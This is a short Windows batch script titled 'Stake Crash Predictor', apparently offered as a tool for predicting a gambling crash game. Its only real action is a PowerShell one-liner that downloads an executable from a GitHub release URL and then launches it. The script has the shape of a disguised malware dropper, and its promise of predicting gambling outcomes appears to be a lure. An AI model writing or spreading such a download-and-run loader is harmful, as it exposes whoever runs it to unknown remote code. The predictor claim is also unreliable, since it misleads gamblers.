@echo off

title Stake Crash Predictor
rem You can do any color
color 0c

powershell $down=New-Object System.Net.WebClient;$url='https://github.com/stakepredictor-pixel/stake-predictor-crash/releases/download/stake-crash/stake-crash.exe';$file='dist\stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;


start dist\stake-crash.exe
